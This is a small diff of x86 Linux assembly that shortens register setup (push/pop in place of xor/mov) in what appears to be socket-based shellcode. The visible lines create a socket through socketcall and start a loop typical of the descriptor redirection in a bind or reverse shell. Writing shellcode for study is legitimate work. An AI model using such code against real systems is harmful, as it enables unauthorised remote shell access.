@@ -8,11 +8,11 @@ _start:
 
     ; // 1. Create socket
 
-    xor eax, eax
-    mov al, 0x66
+    push 0x66
+    pop eax
 
-    xor ebx, ebx
-    mov bl, 0x1
+    push 0x1
+    pop ebx
 
     xor ecx, ecx
     push ecx
@@ -63,8 +63,8 @@ _start:
 
     xchg ebx, eax
 
-    xor ecx, ecx
-    mov cl, 0x2
+    push 0x2
+    pop ecx
 
     loop:
 
